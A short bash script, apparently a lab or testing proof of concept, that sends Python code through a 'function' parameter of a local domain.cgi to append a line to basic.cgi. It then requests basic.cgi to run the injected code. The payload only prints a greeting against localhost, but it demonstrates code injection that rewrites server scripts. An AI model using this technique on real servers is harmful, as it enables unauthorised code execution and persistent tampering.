#!/usr/bin/env bash

# Append a linee to basic.cgi
curl "http://localhost:4567/cgi-bin/domain.cgi?function=open(%27basic.cgi%27,%20%27a%27).write(%22print('Hello to you too\n')%22)" 

# Execute basic.cgi 
curl -s "http://localhost:4567/cgi-bin/basic.cgi"
